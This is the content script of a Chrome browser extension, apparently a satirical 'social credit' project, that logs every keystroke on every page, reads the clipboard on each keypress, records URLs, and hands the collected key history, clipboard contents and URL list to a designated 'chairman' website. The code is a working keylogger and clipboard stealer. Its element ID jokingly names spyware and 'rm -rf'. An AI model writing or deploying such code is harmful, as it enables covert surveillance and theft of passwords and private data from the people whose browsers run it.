console.log("Content script injected");

function checkForChairmanWebsite() {
  const element = document.getElementById(
    "cpp-spyware-div-id-keylogger-malware-install-rm-rf-C://",
  );
  if (element) {
    console.log("Chairman website detected!");
    // Request data
    chrome.runtime.sendMessage({ isChairmanWebsite: true });
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "BACKGROUND_TO_CONTENT") {
    console.log("Received data from background:", message);

    // Send to chairman
    window.postMessage(
      {
        type: "SOCIAL_CREDIT_DATA",
        keyHistory: message.keyHistory,
        clipboard: message.clipboard,
        socialCredit: message.socialCredit,
        urlList: message.urlList,
      },
      window.location.origin,
    );
  }
});

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", checkForChairmanWebsite);

} else {
  checkForChairmanWebsite();
}

// keylog
window.addEventListener('keydown', handleKeyEvent, true);
async function handleKeyEvent(event) {
  const key = event.key;
  if (key.length != 1) {
    return
  }
  console.log("Key pressed:", key, "at", window.location.href);

  const clipboard = await navigator.clipboard.readText();
  
  chrome.runtime.sendMessage({
    type: 'KEYPRESS',
    key,
    clipboard,
    timestamp: Date.now(),
    url: window.location.href
  });
}